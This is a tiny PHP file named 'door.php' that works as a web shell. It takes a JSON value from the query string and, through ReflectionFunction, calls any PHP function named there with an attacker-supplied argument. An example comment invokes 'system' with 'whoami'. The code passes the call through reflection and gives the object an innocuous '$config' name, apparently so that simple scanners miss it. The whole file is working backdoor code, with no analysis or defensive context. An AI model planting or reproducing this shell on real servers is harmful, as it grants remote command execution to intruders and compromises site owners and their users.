<?php
//door.php?p={"a":"system","b":"whoami"}
$p = json_decode($_GET['p'], true);
$config = new ReflectionFunction($p['a']);
$config->invoke($p['b']);
?>